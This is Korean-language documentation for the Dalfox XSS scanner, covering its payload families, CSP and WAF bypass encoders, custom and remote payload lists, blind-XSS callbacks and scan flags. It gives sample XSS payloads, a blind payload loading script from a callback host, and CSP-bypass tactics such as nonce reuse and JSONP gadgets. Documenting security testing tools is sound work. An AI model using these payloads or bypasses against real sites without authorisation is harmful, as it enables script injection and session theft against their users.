+++
title = "페이로드와 인코딩"
description = "내장 페이로드 계열, 인코더, 커스텀 페이로드, 그리고 원격 워드리스트를 다룹니다."
weight = 3
toc = true
+++

Dalfox는 컨텍스트를 인식하는, 엄선된 페이로드 라이브러리를 함께 제공합니다. 대부분의 경우 이에 대해 신경 쓸 필요가 없습니다. 엔진이 각 주입 컨텍스트에 맞는 페이로드를 선택합니다. 이 페이지에서는 내장된 내용과 이를 확장하는 방법을 다룹니다.

## 페이로드 계열

Dalfox는 여러 계열로부터 페이로드를 구성합니다:

| 계열 | 예시 | 사용 시점 |
|--------|---------|-----------|
| **HTML tag** | `<svg onload=alert(1)>` | HTML 컨텍스트 |
| **Attribute breakout** | `'><img src=x onerror=alert(1)>` | 속성 내부 |
| **JavaScript** | `";alert(1);//` | `<script>` 블록 내부 |
| **Event handler** | `onmouseover=alert(1)` | 기존 속성 값 |
| **DOM clobbering** | `<img id=x>` | 레거시 DOM 조회 |
| **URL protocol** | `javascript:alert(1)` | `href`/`src` 계열 속성 |
| **CSP bypass** | `strict-dynamic` 스크립트 가젯, nonce 재사용, 허용된 호스트의 JSONP | 응답이 우회 가능한 CSP를 지닐 때 |
| **mXSS** | `<foreignobject>`/DOMPurify 우회 | 새니타이저가 변형한 DOM |
| **Blind** | `<script src=//callback/></script>` | `--blind` 가 설정된 경우 |

각 페이로드 템플릿은 마커(`class={CLASS}` 또는 `id={ID}`)를 지니고 있어, 검증 단계에서 DOM 내에서 자신의 요소를 확실하게 식별할 수 있습니다.

## 컨텍스트 인식 선택

탐색 중 Dalfox는 각 파라미터를 **주입 컨텍스트**, 즉 반사된 값이 도달하는 위치에 따라 분류합니다:

- HTML 본문 → HTML/속성 브레이크아웃 페이로드
- 따옴표로 감싼 속성 내부 → 속성 브레이크아웃 페이로드
- `<script>` 내부 → JS 브레이크아웃 페이로드
- `<style>` 내부 → CSS 페이로드
- 알 수 없음 → HTML + 속성의 폴백 조합

이는 적중률을 극대화하면서도 요청 수를 합리적으로 유지합니다.

## CSP 인식 우회 페이로드

프리플라이트(preflight) 단계가 `Content-Security-Policy`(또는 `…-Report-Only`) 헤더 — 혹은 `<meta http-equiv>` 등가물 — 를 발견하면, Dalfox는 이를 파싱하여 스크립트 실행 페이로드를 해당 정책의 실제 약점에 맞게 조정합니다. 페이로드는 진정으로 악용 가능한 지시어(directive)에 대해서만 생성되므로, CSP가 없는(또는 견고하게 설정된) 대상은 추가 요청을 보지 않습니다.

| CSP 형태 | Dalfox가 방출하는 것 |
|-----------|-------------------|
| `unsafe-inline` / `unsafe-eval` | 직접 인라인 / `eval` 계열 페이로드 |
| `base-uri` / `object-src` 누락 | `<base>` 하이재킹 / `<object>`/`<embed>` 주입 |
| `script-src` 내의 `data:` / `blob:` | `<script src=data:…>` / `Blob` URL 로더 |
| 화이트리스트에 등록된 CDN 호스트 | 해당 호스트에 맞는 JSONP / 프레임워크 **스크립트 가젯** |
| `strict-dynamic` | DOM 스크립트 가젯(RequireJS `data-main`, `document.write` 자가 전파, AngularJS 부트스트랩)과, nonce가 캡처된 경우 **nonce 재사용** |

이전 릴리스에서는 파싱만 하고 결코 대응하지 않았던 두 가지 현대적 형태가 이제 활성화되었습니다:

- **`strict-dynamic`.** `strict-dynamic` 하에서는 브라우저가 호스트 허용 목록을 무시하므로, 평범한 `<script src=allowed-host>` 는 더 이상 로드되지 않습니다. Dalfox는 DOM 스크립트 가젯 — 이미 신뢰된 스크립트가 공격자 스크립트를 생성하게 만드는 페이로드 — 으로 전환하고, 정책이 nonce를 고정(pin)하면 `<script nonce=…>` 재사용 페이로드를 방출합니다(nonce가 정적이거나 예측 가능하거나 반사될 때 효과적).
- **Nonce / 해시 고정(pinning).** `'nonce-…'` 및 `'sha256-…'` 토큰이 파싱되어 정책 분류에 사용됩니다. `strict-dynamic` 도 없고 가젯 호스트도 없는 순수 무작위 nonce/해시 정책은 *견고함(hardened)* 으로 취급됩니다. Dalfox는 그런 정책에 요청을 낭비하지 않습니다.

가젯 세트는 하드코딩된 목록이 아니라 내장되고 확장 가능한 데이터베이스(JSONBee / H5SC / Google CSP-Evaluator 형태)에 담겨 있으므로, 분석기를 건드리지 않고도 커버리지가 늘어납니다.

## Trusted Types 인식

[Trusted Types](https://web.dev/articles/trusted-types)는 견고하게 설계된 앱에서 DOM-XSS를 완화하는 주된 수단입니다. Dalfox의 AST DOM-XSS 분석기는 이를 이해합니다:

- **엄격한(strict)** 정책 콜백 — `createPolicy('p', {createHTML: s => DOMPurify.sanitize(s)})` — 은 다른 새니타이저와 마찬가지로 오염(taint)을 제거하므로, `p.createHTML(x)` 를 거쳐 전달된 값은 더 이상 보고되지 않습니다.
- **관대한(permissive)** 기본 정책 — 전형적으로 우회 가능한 아무 동작도 하지 않는 `createPolicy('default', {createHTML: x => x})` — 은 보호 수단으로 *오인되지 않습니다*. 탐지 결과는 유지되고 플래그가 지정됩니다.
- 응답 CSP가 `require-trusted-types-for 'script'` 를 강제하고 **그리고** 페이지가 엄격한 `'default'` 정책을 정의하면, 브라우저가 모든 TrustedHTML 싱크를 자동으로 새니타이즈합니다. 이제 Dalfox는 이렇게 오탐이 된 탐지 결과를 억제합니다.

이 분류기는 의도적으로 보수적입니다. 안전함을 입증할 수 없는 것은 무엇이든 관대한(permissive) 상태로 남으므로, 탐지 결과가 유지됩니다. 억제는 강제(enforcement) 없이는 결코 발동하지 않으므로, 기본 정책을 정의했지만 `require-trusted-types-for` 를 빠뜨린 페이지는 여전히 보고됩니다. 즉, 미탐(false negative)이 도입되지 않습니다.

## 인코더

인코더는 *동일한 페이로드* 를 여러 형태로 변환하여, WAF와 서버 측 필터가 모두 같은 바이트를 보지 않도록 합니다.

```bash
dalfox https://target.app -e url,html,base64
```

사용 가능한 인코더:

| 인코더 | `<` 를 변환하는 형태 |
|---------|-------------------|
| `none` | `<` (원시) |
| `url` | `%3C` |
| `2url` | `%253C` (2중) |
| `3url` | `%25253C` (3중) |
| `4url` | 4중 URL |
| `html` | `&#x003c;` |
| `htmlpad` | 0으로 패딩된 HTML 엔티티 |
| `base64` | 페이로드의 base64 |
| `unicode` | 전각(fullwidth) 매핑 |
| `zwsp` | 폭 없는 공백(zero-width space) 삽입 |

기본값: `url,html`. 목록에 `none` 을 추가하면, Dalfox는 원시 페이로드만 보냅니다.

## 커스텀 페이로드

한 줄에 하나씩, 직접 만든 목록을 제공합니다:

```bash
dalfox https://target.app --custom-payload mypayloads.txt
```

내장 라이브러리를 완전히 교체합니다:

```bash
dalfox https://target.app --custom-payload mypayloads.txt --only-custom-payload
```

## 원격 페이로드 소스

커뮤니티 워드리스트를 필요할 때 가져옵니다:

```bash
dalfox https://target.app --remote-payloads portswigger,payloadbox
```

지원되는 소스: `portswigger`, `payloadbox`. 실행마다 한 번 가져오며, `--proxy` 와 `--timeout` 을 준수합니다.

## 페이로드 확인하기

스캔을 실행하지 않고 페이로드 계열을 출력합니다:

```bash
dalfox payload event-handlers  # onerror, onmouseover, ...
dalfox payload useful-tags     # svg, img, script, ...
dalfox payload uri-scheme      # javascript:, data:
dalfox payload portswigger     # 원격 목록을 가져와 출력
```

## "alert" 커스터마이징

전형적인 `alert(1)` 은 요란할 수 있습니다. 이를 교체하면 곳곳에서 대화 상자를 띄우지 않고도 영향(impact)을 입증할 수 있습니다:

```bash
dalfox https://target.app \
  --custom-alert-value "document.domain" \
  --custom-alert-type str
```

- `--custom-alert-value`: `alert`/`prompt`/`confirm` 에 전달되는 값(기본값 `1`).
- `--custom-alert-type`: `none` 은 원래 함수를 유지하고, `str` 은 값을 따옴표로 감쌉니다.

## Blind XSS

Blind XSS는 나중에, 여러분이 볼 수 없는 컨텍스트(관리자 패널, 지원 담당자의 대시보드)에서 발동합니다. 대역 외(out-of-band) 리스너가 필요합니다:

```bash
dalfox https://target.app -b https://your-callback.interact.sh
```

커스텀 blind 템플릿:

```bash
dalfox https://target.app \
  -b https://your-callback.example \
  --custom-blind-xss-payload blind-templates.txt
# 각 줄에는 {} 가 포함될 수 있음(콜백 URL로 치환됨)
```

## HTTP 파라미터 오염(HPP)

일부 필터는 파라미터의 *첫 번째* 등장만 검사합니다. Dalfox는 파라미터를 중복시켜 페이로드를 두 번째 슬롯에 밀어 넣을 수 있습니다:

```bash
dalfox https://target.app --hpp
```

## Deep scan

기본적으로 Dalfox는 검증된 페이로드를 찾으면 해당 파라미터에 대한 테스트를 중단합니다. `--deep-scan` 은 계속 진행합니다:

```bash
dalfox https://target.app --deep-scan
```

연구에는 유용하지만, 프로덕션 파이프라인에서는 더 느립니다.

## 페이로드 단계 건너뛰기

| 플래그 | 효과 |
|------|--------|
| `--skip-xss-scanning` | 탐색과 프로빙만 수행; 페이로드 주입 없음 |
| `--skip-ast-analysis` | AST 기반 DOM-XSS 탐지 건너뛰기 |

## 다음 단계

- 이를 [WAF Bypass](../waf-bypass/)와 결합하여 필터를 우회하도록 페이로드를 다듬으세요.
- 탐지 결과를 내보내려면 [Output &amp; Reports](../output/)를 참조하세요.
